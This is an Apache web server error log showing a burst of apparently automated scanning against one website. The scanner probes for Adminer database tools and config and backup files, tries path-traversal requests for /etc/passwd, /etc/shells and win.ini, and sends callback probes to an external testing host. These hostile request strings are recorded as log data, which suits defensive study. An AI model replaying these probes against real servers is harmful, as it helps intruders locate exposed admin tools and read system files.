[Thu Jul 08 02:42:17.365524 2021] [php7:error] [pid 17747] [client 27.147.202.214:5406] script '/var/www/html/wilkescw.com/adminer-4.6.1.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:42:18.000556 2021] [php7:error] [pid 17615] [client 27.147.202.214:5410] script '/var/www/html/wilkescw.com/adminer-4.6.2.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:42:18.266645 2021] [php7:error] [pid 16652] [client 27.147.202.214:5395] script '/var/www/html/wilkescw.com/adminer-4.4.0-mysql.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:42:18.300964 2021] [php7:error] [pid 17749] [client 27.147.202.214:5379] script '/var/www/html/wilkescw.com/adminer-4.2.5.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:42:18.664398 2021] [php7:error] [pid 17751] [client 27.147.202.214:5382] script '/var/www/html/wilkescw.com/adminer-4.2.5-mysql.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:42:18.740278 2021] [php7:error] [pid 17750] [client 27.147.202.214:5376] script '/var/www/html/wilkescw.com/ad.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:42:18.786574 2021] [php7:error] [pid 17283] [client 27.147.202.214:5381] script '/var/www/html/wilkescw.com/adminer-4.2.5-mysql-en.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:42:19.312617 2021] [php7:error] [pid 17754] [client 27.147.202.214:5378] script '/var/www/html/wilkescw.com/Adminer.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:42:19.362270 2021] [php7:error] [pid 17614] [client 27.147.202.214:5386] script '/var/www/html/wilkescw.com/adminer-4.3.0-mysql.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:42:19.368648 2021] [php7:error] [pid 17756] [client 27.147.202.214:5377] script '/var/www/html/wilkescw.com/ad.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:42:19.452416 2021] [php7:error] [pid 17666] [client 27.147.202.214:5397] script '/var/www/html/wilkescw.com/adminer-4.5.0.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:42:19.518641 2021] [php7:error] [pid 17760] [client 27.147.202.214:5401] script '/var/www/html/wilkescw.com/adminer-4.6.0.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:42:19.526358 2021] [php7:error] [pid 17759] [client 27.147.202.214:5383] script '/var/www/html/wilkescw.com/adminer-4.3.0.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:42:19.531142 2021] [php7:error] [pid 17758] [client 27.147.202.214:5398] script '/var/www/html/wilkescw.com/adminer-4.5.0-en.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:42:19.766468 2021] [php7:error] [pid 17755] [client 27.147.202.214:5390] script '/var/www/html/wilkescw.com/adminer-4.3.1-mysql-en.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:42:20.052496 2021] [php7:error] [pid 17757] [client 27.147.202.214:5394] script '/var/www/html/wilkescw.com/adminer-4.4.0-mysql-en.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:42:20.607598 2021] [php7:error] [pid 17752] [client 27.147.202.214:5370] script '/var/www/html/wilkescw.com/adminer.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:42:20.832765 2021] [php7:error] [pid 17720] [client 27.147.202.214:5405] script '/var/www/html/wilkescw.com/adminer-4.6.0-mysql.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:42:21.160051 2021] [php7:error] [pid 17695] [client 27.147.202.214:5402] script '/var/www/html/wilkescw.com/adminer-4.6.0-en.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:42:21.165397 2021] [php7:error] [pid 17638] [client 27.147.202.214:5412] script '/var/www/html/wilkescw.com/adminer-4.6.2-mysql-en.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:42:21.172487 2021] [php7:error] [pid 17182] [client 27.147.202.214:5399] script '/var/www/html/wilkescw.com/adminer-4.5.0-mysql-en.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:42:21.371026 2021] [php7:error] [pid 17716] [client 27.147.202.214:5393] script '/var/www/html/wilkescw.com/adminer-4.4.0-en.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:42:21.475243 2021] [php7:error] [pid 16532] [client 27.147.202.214:5384] script '/var/www/html/wilkescw.com/adminer-4.3.0-en.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:42:22.723586 2021] [php7:error] [pid 14644] [client 27.147.202.214:5374] script '/var/www/html/wilkescw.com/_adminer.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:42:22.728689 2021] [php7:error] [pid 17724] [client 27.147.202.214:5400] script '/var/www/html/wilkescw.com/adminer-4.5.0-mysql.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:42:22.744551 2021] [php7:error] [pid 16511] [client 27.147.202.214:5409] script '/var/www/html/wilkescw.com/adminer-4.6.1-mysql.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:42:23.169190 2021] [php7:error] [pid 17652] [client 27.147.202.214:5385] script '/var/www/html/wilkescw.com/adminer-4.3.0-mysql-en.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:42:23.247334 2021] [php7:error] [pid 17102] [client 27.147.202.214:5392] script '/var/www/html/wilkescw.com/adminer-4.4.0.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:42:23.917355 2021] [php7:error] [pid 16652] [client 27.147.202.214:5391] script '/var/www/html/wilkescw.com/adminer-4.3.1-mysql.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:42:23.945624 2021] [core:error] [pid 17750] [client 27.147.202.214:5376] AH00126: Invalid URI in request GET /static/../../../../../../../../../../../etc/shells HTTP/1.1
[Thu Jul 08 02:42:24.322172 2021] [php7:error] [pid 17751] [client 27.147.202.214:5388] script '/var/www/html/wilkescw.com/adminer-4.3.1-en.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:42:24.501976 2021] [php7:error] [pid 17748] [client 27.147.202.214:5407] script '/var/www/html/wilkescw.com/adminer-4.6.1-en.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:42:24.757721 2021] [php7:error] [pid 16688] [client 27.147.202.214:5413] script '/var/www/html/wilkescw.com/adminer-4.6.2-mysql.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:42:24.840194 2021] [php7:error] [pid 17759] [client 27.147.202.214:5383] script '/var/www/html/wilkescw.com/opcache.php' not found or unable to stat
[Thu Jul 08 02:42:25.106694 2021] [php7:error] [pid 17756] [client 27.147.202.214:5377] script '/var/www/html/wilkescw.com/opcache.php' not found or unable to stat
[Thu Jul 08 02:42:25.149943 2021] [php7:error] [pid 17174] [client 27.147.202.214:5408] script '/var/www/html/wilkescw.com/adminer-4.6.1-mysql-en.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:42:25.517613 2021] [php7:error] [pid 17641] [client 27.147.202.214:5404] script '/var/www/html/wilkescw.com/adminer-4.6.0-mysql-en.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:42:25.523179 2021] [negotiation:error] [pid 16518] [client 27.147.202.214:5424] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/wilkescw.com/config (None could be negotiated).
[Thu Jul 08 02:42:25.681259 2021] [negotiation:error] [pid 17757] [client 27.147.202.214:5435] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/wilkescw.com/auth (None could be negotiated).
[Thu Jul 08 02:42:26.064654 2021] [php7:error] [pid 17614] [client 27.147.202.214:5426] script '/var/www/html/wilkescw.com/bitrix_server_test.php' not found or unable to stat
[Thu Jul 08 02:42:26.176251 2021] [core:error] [pid 16532] [client 27.147.202.214:5384] AH00126: Invalid URI in request GET /%2e%2e/index.js HTTP/1.1
[Thu Jul 08 02:42:26.507184 2021] [core:error] [pid 17759] [client 27.147.202.214:5383] AH00126: Invalid URI in request GET /%2e%2e/debug.js HTTP/1.1
[Thu Jul 08 02:42:26.607693 2021] [php7:error] [pid 17747] [client 27.147.202.214:5411] script '/var/www/html/wilkescw.com/adminer-4.6.2-en.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:42:26.829027 2021] [core:error] [pid 17751] [client 27.147.202.214:5388] AH00126: Invalid URI in request GET /%2e%2e/release.js HTTP/1.1
[Thu Jul 08 02:42:29.158361 2021] [authz_core:error] [pid 17102] [client 27.147.202.214:5392] AH01630: client denied by server configuration: /var/www/html/wilkescw.com/server-status
[Thu Jul 08 02:42:29.984996 2021] [php7:error] [pid 17283] [client 27.147.202.214:5381] script '/var/www/html/wilkescw.com/coredumpcheck.php' not found or unable to stat
[Thu Jul 08 02:42:31.518773 2021] [php7:error] [pid 16694] [client 27.147.202.214:9214] script '/var/www/html/wilkescw.com/loader-wizard.php' not found or unable to stat
[Thu Jul 08 02:42:33.297074 2021] [core:error] [pid 17747] [client 27.147.202.214:5411] AH00126: Invalid URI in request GET @uri1.hit265250790300239.group.bxss.me/ HTTP/1.1
[Thu Jul 08 02:42:35.265338 2021] [core:error] [pid 16312] [client 27.147.202.214:14760] AH00126: Invalid URI in request GET .uri3.hit265250790300239.group.bxss.me/ HTTP/1.1
[Thu Jul 08 02:42:37.026846 2021] [core:error] [pid 16688] [client 27.147.202.214:5413] AH00126: Invalid URI in request GET @bxss.me/rpb.png HTTP/1.1
[Thu Jul 08 02:42:38.521911 2021] [authz_core:error] [pid 17695] [client 27.147.202.214:14783] AH01630: client denied by server configuration: /var/www/html/wilkescw.com/server-status
[Thu Jul 08 02:42:38.657184 2021] [negotiation:error] [pid 17614] [client 27.147.202.214:5426] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/wilkescw.com/config (None could be negotiated).
[Thu Jul 08 02:42:38.973415 2021] [negotiation:error] [pid 17614] [client 27.147.202.214:5426] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/wilkescw.com/config (None could be negotiated).
[Thu Jul 08 02:42:39.132979 2021] [core:error] [pid 17759] [client 27.147.202.214:14814] AH00126: Invalid URI in request GET /sdk/../../../../../../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 02:42:39.263782 2021] [negotiation:error] [pid 17614] [client 27.147.202.214:5426] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/wilkescw.com/config (None could be negotiated).
[Thu Jul 08 02:42:39.554519 2021] [negotiation:error] [pid 17614] [client 27.147.202.214:5426] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/wilkescw.com/config (None could be negotiated).
[Thu Jul 08 02:42:39.593941 2021] [php7:error] [pid 17774] [client 27.147.202.214:14800] script '/var/www/html/wilkescw.com/vwudj6jdsn3p.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:42:39.845609 2021] [negotiation:error] [pid 17614] [client 27.147.202.214:5426] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/wilkescw.com/config (None could be negotiated).
[Thu Jul 08 02:42:40.014819 2021] [core:error] [pid 17283] [client 27.147.202.214:14759] AH00126: Invalid URI in request GET /../../../../../../../../z/../../../../../../../../../etc/shells HTTP/1.1
[Thu Jul 08 02:42:41.315551 2021] [php7:error] [pid 16312] [client 27.147.202.214:14812] script '/var/www/html/wilkescw.com/css/1i566nabom8i.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:42:41.607398 2021] [core:error] [pid 17766] [client 27.147.202.214:14845] AH00126: Invalid URI in request GET /css/../../../../../../../../z/../../../../../../../../../etc/shells HTTP/1.1
[Thu Jul 08 02:42:42.917289 2021] [php7:error] [pid 17614] [client 27.147.202.214:5426] script '/var/www/html/wilkescw.com/z9DKle39.php' not found or unable to stat
[Thu Jul 08 02:42:43.217999 2021] [php7:error] [pid 16694] [client 27.147.202.214:9214] script '/var/www/html/wilkescw.com/db.php' not found or unable to stat
[Thu Jul 08 02:42:43.672430 2021] [core:error] [pid 14644] [client 27.147.202.214:14875] AH00126: Invalid URI in request GET /css//../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 02:42:43.800142 2021] [php7:error] [pid 16694] [client 27.147.202.214:9214] script '/var/www/html/wilkescw.com/conf.php' not found or unable to stat
[Thu Jul 08 02:42:43.865319 2021] [php7:error] [pid 16532] [client 27.147.202.214:14833] script '/var/www/html/wilkescw.com/xmlrpc.php' not found or unable to stat
[Thu Jul 08 02:42:44.269116 2021] [core:error] [pid 17353] [client 27.147.202.214:5425] AH00126: Invalid URI in request GET /css//../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 02:42:44.362278 2021] [php7:error] [pid 16694] [client 27.147.202.214:9214] script '/var/www/html/wilkescw.com/settings.php' not found or unable to stat
[Thu Jul 08 02:42:44.997282 2021] [core:error] [pid 17719] [client 27.147.202.214:14834] AH00126: Invalid URI in request GET /css//../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 02:42:45.561313 2021] [core:error] [pid 17752] [client 27.147.202.214:14866] AH00126: Invalid URI in request GET /css//../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 02:42:45.624196 2021] [php7:error] [pid 17102] [client 27.147.202.214:5392] script '/var/www/html/wilkescw.com/xmlrpc.php' not found or unable to stat
[Thu Jul 08 02:42:45.896124 2021] [core:error] [pid 17613] [client 27.147.202.214:14844] AH00126: Invalid URI in request GET /css//../../../../../../../../boot.ini HTTP/1.1
[Thu Jul 08 02:42:46.548127 2021] [php7:error] [pid 16312] [client 27.147.202.214:14812] script '/var/www/html/wilkescw.com/xmlrpc.php' not found or unable to stat
[Thu Jul 08 02:42:46.709307 2021] [core:error] [pid 16532] [client 27.147.202.214:14833] AH00126: Invalid URI in request GET /css//../../../../../../../../boot.ini HTTP/1.1
[Thu Jul 08 02:42:47.082003 2021] [core:error] [pid 17755] [client 27.147.202.214:14842] AH00126: Invalid URI in request GET /css//../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 02:42:47.172371 2021] [php7:error] [pid 16518] [client 27.147.202.214:14775] script '/var/www/html/wilkescw.com/xmlrpc.php' not found or unable to stat
[Thu Jul 08 02:42:47.176926 2021] [php7:error] [pid 16312] [client 27.147.202.214:14812] script '/var/www/html/wilkescw.com/app_dev.php' not found or unable to stat
[Thu Jul 08 02:42:47.185584 2021] [php7:error] [pid 17687] [client 27.147.202.214:14804] script '/var/www/html/wilkescw.com/xmlrpc.php' not found or unable to stat
[Thu Jul 08 02:42:47.222678 2021] [php7:error] [pid 16694] [client 27.147.202.214:9214] script '/var/www/html/wilkescw.com/bak.config.php' not found or unable to stat
[Thu Jul 08 02:42:47.669128 2021] [core:error] [pid 16312] [client 27.147.202.214:14812] AH00126: Invalid URI in request GET /css//../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 02:42:47.823575 2021] [php7:error] [pid 16518] [client 27.147.202.214:14775] script '/var/www/html/wilkescw.com/xmlrpc.php' not found or unable to stat
[Thu Jul 08 02:42:48.096219 2021] [core:error] [pid 17102] [client 27.147.202.214:5392] AH00126: Invalid URI in request GET /css//../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 02:42:48.484194 2021] [php7:error] [pid 16518] [client 27.147.202.214:14775] script '/var/www/html/wilkescw.com/xmlrpc.php' not found or unable to stat
[Thu Jul 08 02:42:48.888270 2021] [core:error] [pid 17759] [client 27.147.202.214:14851] AH00126: Invalid URI in request GET /css//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Thu Jul 08 02:42:49.052280 2021] [php7:error] [pid 16694] [client 27.147.202.214:9214] script '/var/www/html/wilkescw.com/old.config.php' not found or unable to stat
[Thu Jul 08 02:42:49.096976 2021] [php7:error] [pid 17754] [client 27.147.202.214:5378] script '/var/www/html/wilkescw.com/phpThumb.php' not found or unable to stat
[Thu Jul 08 02:42:49.164273 2021] [php7:error] [pid 16518] [client 27.147.202.214:14775] script '/var/www/html/wilkescw.com/soap.php' not found or unable to stat
